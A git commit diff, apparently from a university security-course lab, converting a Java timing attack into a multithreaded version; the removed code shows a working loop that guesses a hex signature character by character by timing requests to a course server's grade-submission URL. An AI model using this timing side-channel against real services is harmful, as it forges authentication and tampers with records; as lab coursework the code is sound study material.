e0a98913cb3eb728460f0160f464bb6cff7d5f67
johansvedberg <johan@svedberg.biz>
2016-12-11 21:04:28 +0100

    Multithread

--- src/main/Main.java
+++ src/main/Main.java
@@ -1,9 +1,31 @@
 package main;
 
+import java.util.ArrayList;
+
 public class Main {
 
 	public static void main(String[] args) {
 		TimingAttack attack = new TimingAttack();
+		ArrayList<Thread> nbrOfThreads = new ArrayList<Thread>();
+		char[] alphabet = "abcdef0123456789".toCharArray();
+		System.out.println("Attack underway....");
+
+		for (int i = 0; i < alphabet.length; i++) {
+			Thread t = new Thread(new Processor(attack, alphabet[i]));
+			t.start();
+			nbrOfThreads.add(t);
+		}
+		for (Thread t : nbrOfThreads) {
+			try {
+				t.join();
+
+			} catch (InterruptedException e) {
+
+				e.printStackTrace();
+			}
+		}
+		
+		attack.getMax();
 
 	}
 
--- src/main/TimingAttack.java
+++ src/main/TimingAttack.java
@@ -1,81 +1,45 @@
 package main;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.URL;
-import java.net.URLConnection;
+import java.math.BigInteger;
+import java.util.ArrayList;
 
 public class TimingAttack {
+	private StringBuilder b;
+	private ArrayList<BigInteger> list;
+	private BigInteger largest;
+	char correct; 
 
 	public TimingAttack() {
+		largest = BigInteger.ZERO;
+		list = new ArrayList<BigInteger>();
 
-		URL url = null;
-		char[] alphabet = "abcdef0123456789".toCharArray();
-		URLConnection yc = null;
+	}
 
-		StringBuilder a = null;
-		StringBuilder b = new StringBuilder("");
+	public synchronized void addTooList(BigInteger i) {
+		list.add(i);
 
-		for (int k = 0; k < 12; k++) {
+	}
 
-			char currentBestGuess = 0;
+	public synchronized void clearList() {
+		list.clear();
+	}
+	
+	public synchronized void setCorrect(char c) {
+		correct = c;
+	}
 
-			long longestTime = 0;
-
-			for (int i = 0; i < alphabet.length; i++) {
-				System.out.print(alphabet[i] + ", ");
-
-				long duration = 0;
-				long startTime = System.nanoTime();
-
-				for (int j = 0; j < 50; j++) {
-
-					try {
-
-						if (b.toString().equals("")) {
-							url = new URL(
-									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
-											+ alphabet[i]);
-						} else {
-							url = new URL(
-									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
-											+ b.toString() + alphabet[i]);
-						}
-
-						yc = url.openConnection();
-
-						BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream(), "UTF-8"));
-						String inputLine;
-						a = new StringBuilder();
-						while ((inputLine = in.readLine()) != null) {
-							a.append(inputLine);
-						}
-						in.close();
-
-					} catch (IOException e) {
-
-						e.printStackTrace();
-					}
-
-				}
-
-				long endTime = System.nanoTime();
-				duration = (endTime - startTime) / 50;
-
-				if (duration > longestTime) {
-					longestTime = duration;
-					currentBestGuess = alphabet[i];
-				}
-
-			}
-			b.append(String.valueOf(currentBestGuess));
-			System.out.println("Best guess: " + currentBestGuess);
+	public synchronized boolean isMax(BigInteger i) {
+		if (i.max(largest) == i) {
+			return true;
+		} else {
+			return false;
 		}
-		System.out.println(b.toString());
-	}
-
-	public void startAttack() {
 
 	}
+
+	public void getMax() {
+		System.out.println(correct);
+	}
+	
+
 }
